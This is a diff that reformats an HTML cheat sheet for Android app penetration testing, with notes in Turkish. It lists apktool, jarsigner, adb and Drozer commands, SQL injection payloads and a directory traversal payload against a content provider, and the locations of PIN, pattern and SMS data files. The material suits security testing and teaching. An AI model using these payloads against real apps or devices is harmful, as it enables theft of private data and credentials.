@@ -173,149 +173,62 @@
 
     <tr><td><br></td></tr>
 
-    <tr>
-      <th>-String Çıkarma [Obfuscation varsa]</th>  <th>Description</th>
-    </tr>
-    <tr>
-      <td>/res/values/public.xml</td>  <td>Jd-Gui ciktisindan id alinarak publicte bulunur.</td>
-    </tr>
-    <tr>
-      <td>/res/values/[type].xml</td>  <td>Verinin tipine gore xml dosyalarda tutulur.</td>
-    </tr>
+    <tr><th>-String Çıkarma [Obfuscation varsa]</th><th>Description</th></tr>
+    <tr><td>/res/values/public.xml</td><td>Jd-Gui ciktisindan id alinarak publicte bulunur.</td></tr>
+    <tr><td>/res/values/[type].xml</td><td>Verinin tipine gore xml dosyalarda tutulur.</td></tr>
 
     <tr><td><br></td></tr>
 
-    <tr>
-      <th>-Acilan Paketi Imzalayarak Geri Paketleme</th>  <th>Description</th>
-    </tr>
-    <tr>
-      <td>$apktool b [sourcefolder] -o [apkfile] </td>  <td>tekrar paketleyerek apk yapar.</td>
-    </tr>
-    <tr>
-      <td>$keytool -genkey -v -keystore keyfile -alias mk -keyalg RSA -keysize 2048 -validity 25000</td>  <td>keyfile olusturur.</td>
-    </tr>
-    <tr>
-      <td>$jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore keyfile mario.apk mk</td>  <td>apk imzalama</td>
-    </tr>
-    <tr><td><br></td></tr>
-
-    <tr>
-      <th>Dinamik Analiz</th>  <th>Description</th>
-    </tr>
-    <tr>
-      <td>adb shell monkey -p com.hvl.mobile -v 500</td>  <td>Stress test yapar.</td>
-    </tr>
-    <tr>
-      <td>adb shell am start -n com.example.myapp/com.example.myapp.TargetActivity</td>  <td>İstenilen aktiviteyi direk çalıştırır.</td>
-    </tr>
-    <tr>
-      <td>adb forward tcp:31415 tcp:31415</td>  <td>Drozer için portforward.</td>
-    </tr>
-    <tr>
-      <td>drozer console connect</td>  <td>Drozer baglantısı. Drozer.apk yuklu olmalı ve baslatılmalı.</td>
-    </tr>
-    <tr>
-      <td>run app.package.list</td>  <td>Drozer yüklü paketleri adlarıyla listeler.</td>
-    </tr>
-    <tr>
-      <td>run app.package.info -a com.example.myapp</td>  <td>Paket hakkında bilgi verir.</td>
-    </tr>
-    <tr>
-      <td>run app.package.list -p android.permission.READ_SMS</td>  <td><a href="https://developer.android.com/reference/android/Manifest.permission.html" target="_blank">All Permissions</a> READ_SMS yetkisine sahip uygulamalar.</td>
-    </tr>
-    <tr>
-      <td>run app.package.list -p android.permission.INSTALL_PACKAGES</td>  <td>INSTALL_PACKAGES yetkisine sahip uygulamalar.</td>
-    </tr>
-    <tr>
-      <td>run app.package.list -f "My Application"</td>  <td>Uygulamanın yüklü oldugu yeri verir./data/data</td>
-    </tr>
-    <tr>
-      <td>run app.package.attacksurface com.example.myapp</td>  <td>Uygulamanın zafiyet olabilecek yerlerini gösterir.</td>
-    </tr>
-    <tr>
-      <td>run app.package.list -u 1000</td>  <td>Shell yetkisi olan uygulamaları listeler.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.info -a com.example.myapp</td>  <td>Content Provider izinleri hakkında bilgi verir.</td>
-    </tr>
-    <tr>
-      <td>run scanner.provider.finduris -a com.example.myapp</td>  <td>Content Provider Urllerini gösterir.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.query content://com.example.myapp.contentprovider/notes</td>  <td>Content Provider Urllerini gösterir.</td>
-    </tr>
+    <tr><th>-Acilan Paketi Imzalayarak Geri Paketleme</th><th>Description</th></tr>
+    <tr><td>$apktool b [sourcefolder] -o [apkfile] </td><td>tekrar paketleyerek apk yapar.</td></tr>
+    <tr><td>$keytool -genkey -v -keystore keyfile -alias mk -keyalg RSA -keysize 2048 -validity 25000</td><td>keyfile olusturur.</td></tr>
+    <tr><td>$jarsigner -verbose -sigalg MD5withRSA -digestalg SHA1 -keystore keyfile mario.apk mk</td><td>apk imzalama</td></tr>
 
     <tr><td><br></td></tr>
 
-    <tr>
-      <th>Drozer Permission Alarak Content Provider İle Sql İnjection</th>  <th>Description</th>
-    </tr>
-    <tr>
-      <td>run app.package.list -f "Uygulama Adı"</td>  <td>Uygulama paketi bulunur.</td>
-    </tr>
-    <tr>
-      <td>run app.package.attacksurface com.example.myapp</td>  <td>Content Provider sayısına bakılır.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.info -a com.example.myapp</td>  <td>Uygulama provider izinleri alınır.</td>
-    </tr>
-    <tr>
-      <td>permissions</td>  <td>Drozer izinlerinde gerekli izin olup olmadığı kontrol edilir.</td>
-    </tr>
-    <tr>
-      <td>sudo drozer agent build --permission com.example.myapp.READ_NOTE</td>  <td>Gerekli izin verilerek drozer paketlendi.</td>
-    </tr>
-    <tr>
-      <td>adb uninstall com.mwr.dz</td>  <td>Eski drozer emulatorden silindi.</td>
-    </tr>
-    <tr>
-      <td>sudo mv /tmp/[cp]/agent.apk .</td>  <td>Yeni apk current dizine alındı.</td>
-    </tr>
-    <tr>
-      <td>adb install agent.apk</td>  <td>Yeni drozer kuruldu.</td>
-    </tr>
-    <tr>
-      <td>permissions</td>  <td>Tekrar yetkilere bakıldı.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.query content://com.example.myapp.contentprovider/simple</td>  <td>Yetki ile komut calıştırıldı.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.query content://com.example.myapp.contentprovider/simple --selection "_id=1 or 1=1"</td>  <td>Tüm tabloyu getirir.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.query content://com.example.myapp.contentprovider/simple --projection "* from sqlite_master;"</td>  <td>Provider manipule edilerek baska tablo alınır.</td>
-    </tr>
-    <tr>
-      <td>run app.provider.read content://com.example.myapp/../../../etc/hosts</td>  <td>Canonical path kullanılmadığında Directory Traversal yapılabilir.</td>
-    </tr>
+    <tr><th>Dinamik Analiz</th><th>Description</th></tr>
+    <tr><td>adb shell monkey -p com.hvl.mobile -v 500</td><td>Stress test yapar.</td></tr>
+    <tr><td>adb shell am start -n com.example.myapp/com.example.myapp.TargetActivity</td><td>İstenilen aktiviteyi direk çalıştırır.</td></tr>
+    <tr><td>adb forward tcp:31415 tcp:31415</td><td>Drozer için portforward.</td></tr>
+    <tr><td>drozer console connect</td><td>Drozer baglantısı. Drozer.apk yuklu olmalı ve baslatılmalı.</td></tr>
+    <tr><td>run app.package.list</td><td>Drozer yüklü paketleri adlarıyla listeler.</td></tr>
+    <tr><td>run app.package.info -a com.example.myapp</td><td>Paket hakkında bilgi verir.</td></tr>
+    <tr><td>run app.package.list -p android.permission.READ_SMS</td><td><a href="https://developer.android.com/reference/android/Manifest.permission.html" target="_blank">All Permissions</a> READ_SMS yetkisine sahip uygulamalar.</td></tr>
+    <tr><td>run app.package.list -p android.permission.INSTALL_PACKAGES</td><td>INSTALL_PACKAGES yetkisine sahip uygulamalar.</td></tr>
+    <tr><td>run app.package.list -f "My Application"</td><td>Uygulamanın yüklü oldugu yeri verir./data/data</td></tr>
+    <tr><td>run app.package.attacksurface com.example.myapp</td><td>Uygulamanın zafiyet olabilecek yerlerini gösterir.</td></tr>
+    <tr><td>run app.package.list -u 1000</td><td>Shell yetkisi olan uygulamaları listeler.</td></tr>
+    <tr><td>run app.provider.info -a com.example.myapp</td><td>Content Provider izinleri hakkında bilgi verir.</td></tr>
+    <tr><td>run scanner.provider.finduris -a com.example.myapp</td><td>Content Provider Urllerini gösterir.</td></tr>
+    <tr><td>run app.provider.query content://com.example.myapp.contentprovider/notes</td><td>Content Provider Urllerini gösterir.</td></tr>
 
     <tr><td><br></td></tr>
 
-    <tr>
-      <th>Önemli Dizinler</th>  <th>Description</th>
-    </tr>
-    <tr>
-      <td>/data/data/com.android.providers.telephony/</td>  <td>sms ve mms database sharedprefs diger appslerde burada.</td>
-    </tr>
-    <tr>
-      <td>/data/data/[app_package_name]]/shared_prefs</td>  <td>Uygulamanin paylasilan dosyalari onemli!!!</td>
-    </tr>
-    <tr>
-      <td>/data/data/[app_package_name]]/databases</td>  <td>Uygulamanin database dosyalari onemli!!!</td>
-    </tr>
-    <tr>
-      <td>/data/app/</td>  <td>Tüm uygulamaların apk dosyaları bulunur.</td>
-    </tr>
-    <tr>
-      <td>/data/system/*.key</td> <td>pincode and pattern key file</td>
-    </tr>
-    <tr>
-      <td>/data/system/locksettings.db</td> <td>pin salt value</td>
-    </tr>
-    <tr>
-      <td>/sdcard/</td> <td>sdcard dizini.</td>
-    </tr>
+    <tr><th>Drozer Permission Alarak Content Provider İle Sql İnjection</th><th>Description</th></tr>
+    <tr><td>run app.package.list -f "Uygulama Adı"</td><td>Uygulama paketi bulunur.</td></tr>
+    <tr><td>run app.package.attacksurface com.example.myapp</td><td>Content Provider sayısına bakılır.</td></tr>
+    <tr><td>run app.provider.info -a com.example.myapp</td><td>Uygulama provider izinleri alınır.</td></tr>
+    <tr><td>permissions</td><td>Drozer izinlerinde gerekli izin olup olmadığı kontrol edilir.</td></tr>
+    <tr><td>sudo drozer agent build --permission com.example.myapp.READ_NOTE</td><td>Gerekli izin verilerek drozer paketlendi.</td></tr>
+    <tr><td>adb uninstall com.mwr.dz</td><td>Eski drozer emulatorden silindi.</td></tr>
+    <tr><td>sudo mv /tmp/[cp]/agent.apk .</td><td>Yeni apk current dizine alındı.</td></tr>
+    <tr><td>adb install agent.apk</td><td>Yeni drozer kuruldu.</td></tr>
+    <tr><td>permissions</td><td>Tekrar yetkilere bakıldı.</td></tr>
+    <tr><td>run app.provider.query content://com.example.myapp.contentprovider/simple</td><td>Yetki ile komut calıştırıldı.</td></tr>
+    <tr><td>run app.provider.query content://com.example.myapp.contentprovider/simple --selection "_id=1 or 1=1"</td><td>Tüm tabloyu getirir.</td></tr>
+    <tr><td>run app.provider.query content://com.example.myapp.contentprovider/simple --projection "* from sqlite_master;"</td><td>Provider manipule edilerek baska tablo alınır.</td></tr>
+    <tr><td>run app.provider.read content://com.example.myapp/../../../etc/hosts</td><td>Canonical path kullanılmadığında Directory Traversal yapılabilir.</td></tr>
+
+    <tr><td><br></td></tr>
+
+    <tr><th>Önemli Dizinler</th><th>Description</th></tr>
+    <tr><td>/data/data/com.android.providers.telephony/</td><td>sms ve mms database sharedprefs diger appslerde burada.</td></tr>
+    <tr><td>/data/data/[app_package_name]]/shared_prefs</td><td>Uygulamanin paylasilan dosyalari onemli!!!</td></tr>
+    <tr><td>/data/data/[app_package_name]]/databases</td><td>Uygulamanin database dosyalari onemli!!!</td></tr>
+    <tr><td>/data/app/</td><td>Tüm uygulamaların apk dosyaları bulunur.</td></tr>
+    <tr><td>/data/system/*.key</td><td>pincode and pattern key file</td></tr>
+    <tr><td>/data/system/locksettings.db</td><td>pin salt value</td></tr>
+    <tr><td>/sdcard/</td><td>sdcard dizini.</td></tr>
   </table>
 </br><hr></br>
   <span>Content Provider Schema : content:/package_name/table/id</span>
@@ -349,7 +262,5 @@ function openCity(evt, cityName) {
     evt.currentTarget.className += " active";
 }
 </script>
-
-
 </body>
 </html>
